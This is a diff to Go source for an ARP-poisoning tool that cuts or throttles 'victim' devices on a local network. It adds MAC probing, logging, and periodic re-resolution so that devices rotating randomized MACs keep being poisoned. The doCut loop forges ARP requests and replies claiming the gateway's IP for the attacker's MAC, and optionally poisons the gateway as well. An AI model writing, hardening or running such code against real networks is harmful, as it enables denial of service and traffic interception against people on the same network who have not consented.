@@ -48,7 +48,7 @@ func openArp() (int, error) {
 	return syscall.Socket(syscall.AF_PACKET, syscall.SOCK_DGRAM, int(htons(ethPARP)))
 }
 
-func sendArp(fd, ifindex int, dstMac net.HardwareAddr, body []byte) {
+func sendArp(fd, ifindex int, dstMac net.HardwareAddr, body []byte) error {
 	ll := syscall.SockaddrLinklayer{
 		Protocol: htons(ethPARP),
 		Ifindex:  ifindex,
@@ -56,7 +56,84 @@ func sendArp(fd, ifindex int, dstMac net.HardwareAddr, body []byte) {
 		Halen:    6,
 	}
 	copy(ll.Addr[:6], dstMac)
-	_ = syscall.Sendto(fd, body, 0, &ll)
+	return syscall.Sendto(fd, body, 0, &ll)
+}
+
+// logf writes a timestamped line to stderr. The app runs us with
+// redirectErrorStream, so these land in the flight recorder / Diagnostics — the
+// only way to see what the poisoner did on a device we can't attach a debugger to.
+func logf(format string, args ...interface{}) {
+	fmt.Fprintf(os.Stderr, "[arpcut] "+format+"\n", args...)
+}
+
+// ifaceIPv4 returns the interface's own IPv4 address (needed as the sender IP of
+// ARP probes), or nil.
+func ifaceIPv4(ifi *net.Interface) net.IP {
+	addrs, _ := ifi.Addrs()
+	for _, a := range addrs {
+		if n, ok := a.(*net.IPNet); ok && n.IP.To4() != nil {
+			return n.IP.To4()
+		}
+	}
+	return nil
+}
+
+// resolveMAC returns the CURRENT MAC for ip: first from the kernel ARP table
+// (fast, no traffic), else by actively probing — sending ARP requests and
+// reading replies until timeout. This is bettercap's FindMAC behaviour: never
+// trust a stale scanned MAC, because a device may have changed it (randomized
+// MAC rotation) or the scan entry may be old. Returns nil if unresolved.
+func resolveMAC(fd int, ifi *net.Interface, myIP, ip net.IP, timeout time.Duration) net.HardwareAddr {
+	if mac := arpTableLookup(ip.String(), ifi.Name); mac != nil {
+		return mac
+	}
+	if myIP == nil {
+		return nil
+	}
+	me := ifi.HardwareAddr
+	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
+	_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO,
+		&syscall.Timeval{Sec: 0, Usec: 200_000})
+	deadline := time.Now().Add(timeout)
+	buf := make([]byte, 128)
+	for time.Now().Before(deadline) {
+		_ = sendArp(fd, ifi.Index, bcast, arpBody(arpRequest, me, myIP, bcast, ip))
+		n, _, err := syscall.Recvfrom(fd, buf, 0)
+		if err != nil || n < 28 {
+			continue
+		}
+		if binary.BigEndian.Uint16(buf[6:]) != arpReply {
+			continue
+		}
+		if net.IP(buf[14:18]).Equal(ip) {
+			return net.HardwareAddr(append([]byte(nil), buf[8:14]...))
+		}
+	}
+	// clear the recv timeout so the poison loop isn't affected
+	_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO,
+		&syscall.Timeval{Sec: 0, Usec: 0})
+	return nil
+}
+
+// freshMAC re-resolves ip's MAC. It ALWAYS tries the kernel ARP table first
+// (instant, no traffic). It only sends an active probe when probe==true AND the
+// table missed — so the initial poison starts immediately (we already scanned,
+// so the table is warm), and the slower probe is reserved for the periodic
+// refresh that catches a device changing its MAC. Falls back to the known
+// (scanned) mac so we never end up with none.
+func freshMAC(fd int, ifi *net.Interface, myIP, ip net.IP, known net.HardwareAddr, probe bool) net.HardwareAddr {
+	if m := arpTableLookup(ip.String(), ifi.Name); m != nil {
+		if known != nil && !macEqual(m, known) {
+			logf("MAC for %s changed %s -> %s", ip, known, m)
+		}
+		return m
+	}
+	if probe {
+		if m := resolveMAC(fd, ifi, myIP, ip, 800*time.Millisecond); m != nil {
+			return m
+		}
+	}
+	return known
 }
 
 func doCut(a []string) {
@@ -84,30 +161,83 @@ func doCut(a []string) {
 	}
 	defer syscall.Close(fd)
 	me := ifi.HardwareAddr
-	fmt.Printf("cutting %d victim(s) <-x-> gw %s (%s) via %s (%s)\n", len(vs), gwIP, gwMac, a[0], me)
+	myIP := ifaceIPv4(ifi)
+
+	// Resolve the CURRENT gateway MAC (bettercap always works from a freshly
+	// resolved MAC, never a stale one). Probe if it isn't already in the ARP
+	// table; fall back to the caller-supplied MAC.
+	gwMac = freshMAC(fd, ifi, myIP, gwIP, gwMac, true)
+	if gwMac == nil {
+		logf("FATAL: gateway %s MAC unresolved", gwIP)
+		os.Exit(1)
+	}
+
+	// Resolve each victim's current MAC (probe on a table miss so a stale scanned
+	// MAC can't make the poison silently land nowhere), dropping the unreachable.
+	live := vs[:0]
+	for _, v := range vs {
+		v.mac = freshMAC(fd, ifi, myIP, v.ip, v.mac, true)
+		if v.mac == nil {
+			logf("skip %s: MAC unresolved", v.ip)
+			continue
+		}
+		if macEqual(v.mac, me) {
+			logf("skip %s: is this device", v.ip)
+			continue
+		}
+		live = append(live, v)
+	}
+	vs = live
+	if len(vs) == 0 {
+		logf("FATAL: no reachable victims")
+		os.Exit(2)
+	}
+	logf("cutting %d victim(s) via gw %s (%s) on %s (%s)", len(vs), gwIP, gwMac, a[0], me)
 
 	var deadline time.Time
 	if secs > 0 {
 		deadline = time.Now().Add(time.Duration(secs) * time.Second)
 	}
 	tick := interval()
+	// Re-resolve MACs roughly every 15 s so a device that reconnects with a new
+	// (randomized) MAC keeps getting poisoned instead of silently escaping.
+	refreshEvery := int((15 * time.Second) / tick)
+	if refreshEvery < 1 {
+		refreshEvery = 1
+	}
+	round := 0
 	for {
+		if round > 0 && round%refreshEvery == 0 {
+			gwMac = freshMAC(fd, ifi, myIP, gwIP, gwMac, true)
+			for i := range vs {
+				vs[i].mac = freshMAC(fd, ifi, myIP, vs[i].ip, vs[i].mac, true)
+			}
+		}
+		var sendErr error
 		for _, v := range vs {
 			// Poison victim: "gwIP is at me". Request (target=victim) + reply.
-			sendArp(fd, ifi.Index, v.mac, arpBody(arpRequest, me, gwIP, v.mac, v.ip))
+			if e := sendArp(fd, ifi.Index, v.mac, arpBody(arpRequest, me, gwIP, v.mac, v.ip)); e != nil {
+				sendErr = e
+			}
 			sendArp(fd, ifi.Index, v.mac, arpBody(arpReply, me, gwIP, v.mac, v.ip))
 			if v.both {
-				// Poison gateway: "victimIP is at me". Only for throttling — a
-				// pure cut skips this so the gateway never sees our MAC own
-				// another host's IP (avoids router ARP-flood isolation).
+				// Poison gateway: "victimIP is at me". Only in full-duplex
+				// (throttle/meter); a pure cut skips this so the gateway never
+				// sees our MAC own another host's IP (avoids ARP-flood isolation).
 				sendArp(fd, ifi.Index, gwMac, arpBody(arpRequest, me, v.ip, gwMac, gwIP))
 				sendArp(fd, ifi.Index, gwMac, arpBody(arpReply, me, v.ip, gwMac, gwIP))
 			}
+		}
+		// Surface a persistent send failure once per ~5 s so it shows in
+		// Diagnostics rather than failing silently.
+		if sendErr != nil && round%int(5*time.Second/tick+1) == 0 {
+			logf("send error: %v", sendErr)
 		}
 		if secs > 0 && time.Now().After(deadline) {
 			return
 		}
 		time.Sleep(tick)
+		round++
 	}
 }
 
@@ -146,6 +276,19 @@ func doHeal(a []string) {
 		os.Exit(1)
 	}
 	defer syscall.Close(fd)
+	myIP := ifaceIPv4(ifi)
+	// Restore using the REAL current MACs (bettercap resolves them in unSpoof).
+	// Our own ARP table isn't poisoned (we only poison others), so it holds the
+	// true gateway + victim MACs.
+	gwMac = freshMAC(fd, ifi, myIP, gwIP, gwMac, false)
+	if gwMac == nil {
+		logf("heal: gateway %s MAC unresolved, aborting", gwIP)
+		return
+	}
+	for i := range vs {
+		vs[i].mac = freshMAC(fd, ifi, myIP, vs[i].ip, vs[i].mac, false)
+	}
+	logf("healing %d victim(s) + segment broadcast, gw %s (%s)", len(vs), gwIP, gwMac)
 	bcast := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
 	for round := 0; round < 10; round++ {
 		// Broadcast the REAL gateway mapping to the whole segment — the key step
